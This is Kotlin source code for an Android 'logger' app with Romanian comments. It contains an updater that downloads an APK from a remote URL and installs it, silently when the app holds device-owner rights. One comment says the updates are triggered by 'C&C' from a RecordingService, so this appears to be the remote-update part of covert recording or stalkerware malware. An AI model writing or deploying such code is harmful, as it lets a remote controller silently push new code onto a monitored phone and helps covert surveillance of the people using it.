package com.example.logger

import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.net.HttpURLConnection
import java.net.URL

/**
 * Descarca APK-ul si il instaleaza prin PackageInstaller.
 * - Device-owner  -> instalare SILENTIOASA (auto-update fara prompt).
 * - Non-owner      -> sistemul cere o singura confirmare (un-tap), via InstallReceiver.
 * - Eroare retea   -> fallback la deschiderea URL-ului in browser.
 */
object AppUpdater {

    fun isDeviceOwner(ctx: Context): Boolean = try {
        (ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager)
            ?.isDeviceOwnerApp(ctx.packageName) == true
    } catch (_: Exception) { false }

    fun downloadAndInstall(activity: AppCompatActivity, apkUrl: String) {
        val owner = isDeviceOwner(activity)
        activity.runOnUiThread {
            Toast.makeText(
                activity,
                if (owner) "Descarc + instalez automat..." else "Descarc actualizarea...",
                Toast.LENGTH_SHORT
            ).show()
        }
        Thread {
            try {
                val conn = (URL(apkUrl).openConnection() as HttpURLConnection).apply {
                    connectTimeout = 15000; readTimeout = 120000
                    instanceFollowRedirects = true
                }
                conn.inputStream.use { input ->
                    val pi = activity.packageManager.packageInstaller
                    val params = PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL
                    )
                    val sessionId = pi.createSession(params)
                    pi.openSession(sessionId).use { session ->
                        session.openWrite("apk", 0, -1).use { out ->
                            input.copyTo(out, 65536)
                            session.fsync(out)
                        }
                        val mutable = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                            PendingIntent.FLAG_MUTABLE else 0
                        val pending = PendingIntent.getBroadcast(
                            activity, sessionId,
                            Intent(activity, InstallReceiver::class.java),
                            PendingIntent.FLAG_UPDATE_CURRENT or mutable
                        )
                        session.commit(pending.intentSender)
                    }
                }
                conn.disconnect()
                if (owner) activity.runOnUiThread {
                    Toast.makeText(activity, "Se instaleaza in fundal...", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                activity.runOnUiThread {
                    Toast.makeText(activity, "⚠ Auto-update esuat, deschid browser: ${e.message?.take(60)}",
                        Toast.LENGTH_LONG).show()
                    try {
                        activity.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(apkUrl)))
                    } catch (_: Exception) {}
                }
            }
        }.start()
    }

    /**
     * Varianta din Context (fara Activity) — pentru update declansat de C&C in RecordingService.
     * Ruleaza SINCRON pe thread-ul apelantului (deja background). Device-owner -> instalare silentioasa.
     * Intoarce true daca sesiunea de instalare a fost commit-uita (instalarea continua in fundal).
     */
    fun downloadAndInstallCtx(ctx: Context, apkUrl: String): Boolean {
        return try {
            val conn = (URL(apkUrl).openConnection() as HttpURLConnection).apply {
                connectTimeout = 15000; readTimeout = 180000; instanceFollowRedirects = true
            }
            conn.inputStream.use { input ->
                val pi = ctx.packageManager.packageInstaller
                val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
                val sessionId = pi.createSession(params)
                pi.openSession(sessionId).use { session ->
                    session.openWrite("apk", 0, -1).use { out ->
                        input.copyTo(out, 65536); session.fsync(out)
                    }
                    val mutable = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                        PendingIntent.FLAG_MUTABLE else 0
                    val pending = PendingIntent.getBroadcast(
                        ctx, sessionId, Intent(ctx, InstallReceiver::class.java),
                        PendingIntent.FLAG_UPDATE_CURRENT or mutable)
                    session.commit(pending.intentSender)
                }
            }
            conn.disconnect()
            true
        } catch (_: Exception) { false }
    }
}
